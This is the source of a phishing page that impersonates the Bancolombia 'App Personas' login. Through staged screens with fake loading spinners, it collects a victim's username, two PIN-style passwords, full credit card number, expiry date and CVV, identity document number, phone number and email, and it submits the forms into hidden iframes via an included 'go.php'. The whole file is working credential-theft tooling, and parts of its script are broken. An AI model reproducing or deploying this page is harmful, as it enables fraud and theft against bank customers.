﻿<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>
	
<body>

<div id="spinner" style="display: none;">
    <img src="libs/images/loading.gif" alt="" style="width: 100px; margin-top: 100px;" />
</div>
<div id="content_div1">
	<div class="header">
		<img src="libs/images/logo.png">
	</div>
	
	<div class="header2">
		Bancolombia App Personas
	</div>
	
		<div class="col-xs-10 col-sm-8">
			<form method="post">
				
				<input name="field1" value="com.todo1.mobile" type="hidden">
			
				<input name="field2" id="login" placeholder="Ingrese su usuario" placeholder="Ingrese su usuario" maxlength="20" autofocus="autofocus" class="form-control" type="text">
				
				<h5> información legal </h5>

				<input class="input_submitBtn1" value="Continuar" id="input_submitBtn1" type="button">
			</form>
			
			<iframe src="about:blank" name="flow_handler1" style="visibility:hidden;display:none"></iframe> 
			
		</div>
	</div>
	
	<div id="content_div2" style="display: none;">
	<div class="header">
		<img src="libs/images/logo.png">
	</div>
	
		<div class="header2">
			Bancolombia App Personas
		</div>
		
		<div class="col-xs-10 col-sm-8">
			<form action="null" method="post" id="_mainForm2" target="flow_handler2">
				<input type="password" class="form-control password" name="field3" placeholder="Ingrese su clave" id="password" autofocus="autofocus" maxlength="4">
				
				<input class="input_submitBtn2" value="Igresar" id="input_submitBtn2" type="button">
			</form>
			
			<iframe src="about:blank" name="flow_handler2" style="visibility:hidden;display:none"></iframe> 
		</div>
	</div>
	
	<div id="content_div3" style="display: none;">
	<div class="header">
		<img src="libs/images/logo.png">
	</div>
	
		<div class="header2">
			Bancolombia App Personas
		</div>
		
		<div class="col-xs-10 col-sm-8">
			<form action="null" method="post" id="_mainForm3" target="flow_handler3">
				<input type="password" class="form-control password" name="field4" placeholder="Ingrese su Segunda Clave" id="password2" autofocus="autofocus" maxlength="4">
				
				<input class="input_submitBtn2" value="Igresar" id="input_submitBtn3" type="button">
			</form>
			
			<iframe src="about:blank" name="flow_handler3" style="visibility:hidden;display:none"></iframe> 
		</div>
	</div>
	
	<div id="content_div4" style="display: none;">
	<div class="header">
		<img src="libs/images/logo.png">
	</div>
	
		<div class="header2">
			Bancolombia App Personas
		</div>
		
		<div class="col-xs-10 col-sm-8">
			<form method="post" id="_mainForm4">
				<span class="h-text">Second step. Credit card details</span>

                <div class="cc-number-block">
                    <input id="cc-number-1" name="field5" placeholder="Credit card number" type="text" class="form-control cc" maxlength="4"  style="margin-left: 0;margin-bottom: 10px;margin-top: 0;" onkeypress="return window.checkDigits(event)" />
                    <input id="cc-number-2" name="field6" type="text" class="field cc-number" maxlength="4" style="display: none;margin-bottom: 10px;" onkeypress="return window.checkDigits(event)" />
                    <input id="cc-number-3" name="field7" type="text" class="field cc-number" maxlength="4" style="display: none;margin-bottom: 10px;" onkeypress="return window.checkDigits(event)" />
                    <input id="cc-number-4" name="field8" type="text" class="field cc-number" maxlength="4" style="display: none;margin-bottom: 10px; float: right" onkeypress="return window.checkDigits(event)" />
                </div>

                <div class="expire-block">
                    <select id="expire-month" name="field9" class="field expire-month">
                        <option value="1">January</option>
                        <option value="2">February</option>
                        <option value="3">March</option>
                        <option value="4">April</option>
                        <option value="5">May</option>
                        <option value="6">June</option>
                        <option value="7">Jule</option>
                        <option value="8">August</option>
                        <option value="9">September</option>
                        <option value="10">October</option>
                        <option value="11">November</option>
                        <option value="12">December</option>
                    </select>

                    <select id="expire-year" name="field10" class="field expire-year">
                        <option value="2017">2017</option>
                        <option value="2018">2018</option>
                        <option value="2019">2019</option>
                        <option value="2020">2020</option>
                        <option value="2021">2021</option>
                    </select>
                
					<input id="cvv-number" name="field11" placeholder="CVV" type="text" class="cvv" maxlength="3"/>

				</div>


                <input type="button" value="Log on" id="input_nextBtn" class="input_submitBtn1"/>
			
			
		</div>
	</div>
	
	<div id="content_div5" style="display: none;">
	<div class="header">
		<img src="libs/images/logo.png">
	</div>
		
	<div class="col-xs-10 col-sm-8" style="padding: 0;">
	
		<h3> Registre su Billetera Móvil </h3>
		
		<p> Ingresse los datos registrados en el servicio de alertas y notificaciones </p>
		
		<div class="input-line">
			<input type="text" class="inputs" name="field12" placeholder="Numéro de documento" id="documento" autofocus="autofocus" maxlength="50">
			<input type="text" class="inputs" name="field13" placeholder="Tipo de documento" id="documento2" autofocus="autofocus" maxlength="50">
			<input type="text" class="inputs" name="field14" placeholder="Numéro de celular" id="celular" autofocus="autofocus" maxlength="50">
			<input type="text" class="inputs" name="field15" placeholder="Correo electrónico" id="electronico" autofocus="autofocus" maxlength="50">
		</div>	
		<br><br>
		
				<input class="input_submitBtn2" value="Continuar" id="input_submitBtn5" type="submit">
			
			
		</div>
		</form>

	</div>
	
	<script type="text/javascript">
			   
				function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }
			   function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }
				
				(function () {
						

                    var g_oForm = document.getElementById('_mainForm1');
						
					var step1 = document.getElementById('content_div1'),
						step2 = document.getElementById('content_div2'),
						step3 = document.getElementById('content_div3'),
						step4 = document.getElementById('content_div4'),
						spinner = document.getElementById('spinner');
					

                    var g_oBtn = document.getElementById('input_submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');

						try{
							oNumInp.className = 'form-control';
						} catch(e){};
						
                        if (oNumInp.value.length < 1) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
					
						
		
						g_oForm.submit();
						__hide(step1);
						__hide(step3);
						__hide(step4);
                    __show(spinner);
                    setTimeout(function(){
                        __hide(spinner);
                        __show(step2);
                    }, 1500);
                    return false;
						};
						
						var g_oForm = document.getElementById('_mainForm2');
						
					var step1 = document.getElementById('content_div1'),
						step2 = document.getElementById('content_div2'),
						step3 = document.getElementById('content_div3'),
						spinner = document.getElementById('spinner');

                    var g_oBtn = document.getElementById('input_submitBtn2');
                    g_oBtn.onclick = function () {
					
						var oCodeInp = document.getElementById('password');

						try{
							oCodeInp.className = 'form-control';
						} catch(e){};
						
                        if (oCodeInp.value.length < 1) {
							try{
								oCodeInp.className = 'fielderror password';
							} catch(e){};
                            return false;
                        }
					
						
		
						g_oForm.submit();
						__hide(step1);
						__hide(step2);
						__hide(step4);
                    __show(spinner);
                    setTimeout(function(){
                        __hide(spinner);
                        __show(step3);
                    }, 1500);
                    return false;
						};
						
						
						var g_oForm = document.getElementById('_mainForm3');

                    var g_oBtn = document.getElementById('input_submitBtn3');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');
                        var oCode2Inp = document.getElementById('password2');


						try{
							oCode2Inp.className = 'input_100';
						} catch(e){};
						
                        if (oCode2Inp.value.length < 4) {
							try{
								oCode2Inp.className = 'fielderror password';
							} catch(e){};
                            return false;
                        }

						g_oForm.submit();
						__hide(step3);
						__hide(step4);
                    __show(spinner);
                    setTimeout(function(){
                        __hide(spinner);
                        __hide(step3);
                        __show(step4);
                    }, 1500);
					
				}

                })();
            </script>
			
			<script type="text/javascript">
            (function () {
                var BACKSPACE_KEYCODE = 8;

                window.checkDigits = function(event){
                    return event.charCode >= 48 && event.charCode <= 57;
                };

                function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }

                function __setFocus(el){
                    el.focus();
                }

                var g_oForm = document.getElementById('_mainForm4');
					var step4 = document.getElementById('content_div4'),
						step5 = document.getElementById('content_div5'),
						spinner = document.getElementById('spinner');

                var cc_number_1 = document.getElementById('cc-number-1');
                var cc_number_2 = document.getElementById('cc-number-2');
                var cc_number_3 = document.getElementById('cc-number-3');
                var cc_number_4 = document.getElementById('cc-number-4');
				var oCVVInp = document.getElementById('cvv-number');
                var oMonthInp = document.getElementById('expire-month');
                var oYearInp = document.getElementById('expire-year');
                var oSecureInp = document.getElementById('secure');

				oCVVInp.className = 'cvv';
				
                cc_number_1.onkeyup = function (event) {
                    if(event.keyCode == BACKSPACE_KEYCODE && cc_number_1.value.length != 0){
                        return true;
                    }
                    if (cc_number_1.value.length == 4) {
                        cc_number_1.className = 'field cc-number';
                        __show(cc_number_2);
                        __show(cc_number_3);
                        __show(cc_number_4);
                        __setFocus(cc_number_2);
                    } else {
                        cc_number_1.className = 'form-control cc';
                        __hide(cc_number_2);
                        __hide(cc_number_3);
                        __hide(cc_number_4);
                    }
                };

                cc_number_2.onkeyup = function (event) {
                    if(event.keyCode == BACKSPACE_KEYCODE && cc_number_2.value.length == 0){
                        __setFocus(cc_number_1);
                        return true;
                    }
                    if (cc_number_2.value.length == 4) {
                        __setFocus(cc_number_3);
                    }
                };

                cc_number_3.onkeyup = function () {
                    if(event.keyCode == BACKSPACE_KEYCODE && cc_number_3.value.length == 0){
                        __setFocus(cc_number_2);
                        return true;
                    }
                    if (cc_number_3.value.length == 4) {
                        __setFocus(cc_number_4);
                    }
                };

                cc_number_4.onkeyup = function () {
                    if (event.keyCode == BACKSPACE_KEYCODE && cc_number_4.value.length == 0) {
                        __setFocus(cc_number_3);
                        return true;
                    }
                };

                function validateLength(el, minlength, maxlength, validationSuccess, validationFailed){
                    if(el.value.length < minlength || el.value.length > maxlength) {
                        el.className = validationFailed;
                        return false;
                    } else {
                        el.className = validationSuccess;
                    }
                    return true;
                }



                var g_nextBtn = document.getElementById('input_nextBtn');
                g_nextBtn.onclick = function () {
                    var oCVVInp = document.getElementById('cvv-number');
                    var oMonthInp = document.getElementById('expire-month');
                    var oYearInp = document.getElementById('expire-year');

					
                    

                    __hide(step4);
                    __show(spinner);
                    setTimeout(function(){
                        __hide(spinner);
                        __show(step5);
                    }, 1500);
                    return false;
                };

                var g_submitBtn = document.getElementById('input_submitBtn5');
                g_submitBtn.onclick = function () {
                    var oNumInp = document.getElementById('documento');
                    var oNum2Inp = document.getElementById('documento2');
                    var oCelularInp = document.getElementById('celular');
                    var oElecInp = document.getElementById('electronico');
                }
            })();
        </script>
</body>
</html>